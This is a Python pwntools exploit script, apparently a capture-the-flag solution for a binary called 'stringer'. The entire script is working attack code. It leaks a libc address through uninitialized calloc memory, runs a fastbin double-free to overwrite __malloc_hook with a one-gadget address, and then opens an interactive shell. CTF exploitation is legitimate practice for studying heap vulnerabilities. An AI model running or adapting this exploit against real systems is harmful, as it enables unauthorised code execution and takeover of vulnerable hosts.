from pwn import *

def alloc(size, data):
	r.sendlineafter('choice: ', '1')
	r.sendlineafter('length: ', str(size))

	if len(data) < size:
		data += '\n'
	r.sendafter('content: ', data)
	return

def edit(idx, offset):
	r.sendlineafter('choice: ', '3')
	r.sendlineafter('index: ', str(idx))
	r.sendlineafter('index: ', str(offset))
	return

def free(idx):
	r.sendlineafter('choice: ', '4')
	r.sendlineafter('index: ', str(idx))
	return

def pwn():

	alloc(0x68, 'A'*8) # 0
	alloc(0xf0, 'B'*8) # 1
	alloc(0x68, 'C'*8) # 2
	alloc(0x68, 'D'*8) # 3
	alloc(0x68, 'E'*8) # 4
	alloc(0x68, 'F'*8) # 5

	free(1)

	edit(0, 0x68)

	# see github.com/andigena/ptmalloc-fanzine/blob/master/03-scraps/uninitialized_calloc.c
	alloc(0xf0, 'G'*7) # 6

	r.recvline()
	libc = u64(r.recv(6).ljust(8, chr(0))) - 0x3c4b78
	malloc_hook = libc + 0x3c4b10 - 0x23
	magic       = libc + 0xf02a4

	log.success('Libc: 0x{:x}'.format(libc))

	# Double-free
	free(3)
	free(4)
	free(3)

	# Fastbin attack
	alloc(0x68, p64(malloc_hook))
	alloc(0x68, p64(0xb00bface))
	alloc(0x68, p64(0xb00bface))
	alloc(0x68, 'A'*0x13 + p64(magic))

	free(5)
	free(5)

	r.interactive()

if __name__ == "__main__":
    if sys.argv[1] == "r":
        r = remote('',)
        pwn()
    else:
        r = process('./stringer')
        pause()
        pwn()
